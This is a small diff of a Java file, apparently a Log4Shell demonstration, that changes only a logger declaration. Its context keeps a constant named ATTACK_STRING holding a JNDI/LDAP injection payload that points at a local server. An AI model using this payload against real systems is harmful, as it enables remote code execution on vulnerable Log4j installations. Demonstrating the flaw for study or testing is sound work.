@@ -17,7 +17,7 @@ import java.util.Scanner;
  */
 public class Main {
 
-    private static final Logger LOGGER = LogManager.getLogger();
+    private static final Logger LOGGER = LogManager.getLogger(Main.class);
 
     private static final String ATTACK_STRING = "${jndi:ldap://127.0.0.1:1389/Attack}";
 
